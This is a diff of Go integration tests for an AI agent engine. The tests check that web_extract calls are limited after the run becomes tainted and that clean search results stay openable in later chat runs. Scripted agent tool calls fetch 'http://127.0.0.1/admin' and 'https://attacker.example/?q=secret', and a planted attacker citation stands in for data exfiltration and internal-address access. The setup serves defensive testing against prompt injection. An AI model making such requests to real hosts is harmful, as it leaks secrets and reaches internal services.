@@ -467,8 +467,9 @@ func TestIntegrationAgentEngineWebExtractSecondLine(t *testing.T) {
 		mu.Unlock()
 		return Page{URL: rawURL, Title: "Page", Content: "page text"}, nil
 	}
-	// The run is tainted when it searches: only the citation is a result,
-	// not the link the search model wrote in its text.
+	// The run's first search is clean (its results open after taint); only
+	// the citation is a result, not the link the search model wrote in its
+	// text.
 	citation, _ := json.Marshal(obj{"type": "url_citation", "url_citation": obj{"url": "https://found.example.net/a", "title": "Found"}})
 	searching := &fakeSearch{can: true, answer: WireMessage{Role: "assistant", Content: "See https://found.example.net/a and https://written.example.org/x",
 		Annotations: []json.RawMessage{citation}}}
@@ -477,10 +478,10 @@ func TestIntegrationAgentEngineWebExtractSecondLine(t *testing.T) {
 		return toolCallLine(callID, "web_extract", obj{"urls": []string{link}}, 1)
 	}
 	c := h.chatWith("Check typed.example.com please", "supervised", "second-line", lines(
+		toolCallLine("s1", "web_search", obj{"query": "found"}, 1),
 		extract("x1", "http://127.0.0.1/admin"),
 		extract("x2", "https://typed.example.com/"),
 		extract("x3", "https://attacker.example/?q=secret"),
-		toolCallLine("s1", "web_search", obj{"query": "found"}, 1),
 		extract("x4", "https://found.example.net/a"),
 		extract("x5", "https://found.example.net/b"),
 		extract("x6", "https://found.example.net/b?q=secret"),
@@ -492,7 +493,7 @@ func TestIntegrationAgentEngineWebExtractSecondLine(t *testing.T) {
 	h.wait(c.ID, "replied", statusIs("idle"))
 	var pageErrors []string
 	for i, r := range h.toolResults() {
-		if i == 3 {
+		if i == 0 {
 			continue // the search
 		}
 		var body struct {
@@ -601,5 +602,91 @@ func TestIntegrationAgentEngineStopAfterTheSendReachesTheRun(t *testing.T) {
 				t.Fatal("no learning.stop after the send")
 			}
 		})
+	}
+}
+
+// queryCiting is a search model that cites the addresses listed for the
+// first word of the query.
+type queryCiting map[string][]string
+
+func (q queryCiting) Complete(_ context.Context, messages []WireMessage, _ []any, _ bool) (WireMessage, error) {
+	answer := WireMessage{Role: "assistant", Content: "Results."}
+	words := strings.Fields(messages[len(messages)-1].Content)
+	for _, link := range q[words[0]] {
+		a, _ := json.Marshal(obj{"type": "url_citation", "url_citation": obj{"url": link}})
+		answer.Annotations = append(answer.Annotations, a)
+	}
+	return answer, nil
+}
+
+func (queryCiting) CanSearch() bool { return true }
+
+// Review round 7: a clean search's results stay openable in the chat's
+// later runs, as the worker allows them (Go kept them on the chat and hands
+// them back in run.start.search_results), and so does a row the worker
+// reports for a keyed backend's clean search. A search made after taint
+// keeps its results text in every run.
+func TestIntegrationAgentEngineSearchResultsOpenInLaterRuns(t *testing.T) {
+	h := newEngineHarness(t)
+	var mu sync.Mutex
+	var fetched []string
+	h.e.opts.Fetch = func(_ context.Context, rawURL string) (Page, error) {
+		mu.Lock()
+		fetched = append(fetched, rawURL)
+		mu.Unlock()
+		return Page{URL: rawURL, Title: "Page", Content: "page text"}, nil
+	}
+	ramen, keyed, planted := "https://ramen.example/top-ten", "https://keyed.example/r", "https://attacker.example/h/4"
+	h.s.SetCompleters(searchCompleters{queryCiting{"best": {ramen}, "zq7": {planted}}})
+	c := h.chatWith("find the best ramen", "supervised", "later-runs", lines(
+		toolCallLine("s1", "web_search", obj{"query": "best ramen"}, 1),
+		toolCallLine("s2", "web_search", obj{"query": "zq7 more"}, 1),
+		reply("Here are some.", 0),
+	), func(c *Conversation) { c.WebSearch = true })
+	c = h.wait(c.ID, "replied", statusIs("idle"))
+	if !slices.Equal(c.SearchResults, SearchResults{ramen}) || len(c.TaintedSources) == 0 {
+		t.Fatalf("after run 1: search_results %q, tainted %+v", c.SearchResults, c.TaintedSources)
+	}
+	h.kit.Fixture("later-runs", lines(
+		obj{"type": "taint", "sources": []TaintSource{}, "search_results": []string{keyed}},
+		toolCallLine("x1", "web_extract", obj{"urls": []string{ramen}}, 1),
+		toolCallLine("s3", "web_search", obj{"query": "site:ramen.example top ten"}, 1),
+		toolCallLine("x2", "web_extract", obj{"urls": []string{planted}}, 1),
+		reply("Opened it.", 0),
+	))
+	if code, body := h.post("/chats/"+c.ID+"/messages", `{"content":"open the top ten list"}`); code != 200 {
+		t.Fatalf("send: %d %s", code, body)
+	}
+	c = h.wait(c.ID, "replied again", func(c Conversation) bool { return c.Status == "idle" && len(c.Messages) >= 4 })
+	starts := h.kit.ReceivedOf("run.start")
+	var second struct {
+		SearchResults []string `json:"search_results"`
+	}
+	if len(starts) != 2 || starts[1].Decode(&second) != nil || !slices.Equal(second.SearchResults, []string{ramen}) {
+		t.Fatalf("run 2's run.start search_results %q (%d run.starts)", second.SearchResults, len(starts))
+	}
+	results := h.toolResults()
+	if len(results) != 5 {
+		t.Fatalf("%d tool.results", len(results))
+	}
+	var page struct {
+		Pages []webPage `json:"pages"`
+	}
+	if json.Unmarshal(results[2].Result, &page) != nil || len(page.Pages) != 1 || page.Pages[0].Error != "" {
+		t.Fatalf("run 2 opening run 1's clean result: %s", results[2].Result)
+	}
+	if strings.Contains(string(results[3].Result), pasteLink) {
+		t.Fatalf("run 2's search naming run 1's result host: %s", results[3].Result)
+	}
+	if !strings.Contains(string(results[4].Result), pasteLink) {
+		t.Fatalf("a result of a search after taint: %s", results[4].Result)
+	}
+	mu.Lock()
+	defer mu.Unlock()
+	if !slices.Equal(fetched, []string{ramen}) {
+		t.Fatalf("fetched %q", fetched)
+	}
+	if !slices.Equal(c.SearchResults, SearchResults{ramen, keyed}) {
+		t.Fatalf("search_results %q, want the clean ones only", c.SearchResults)
 	}
 }
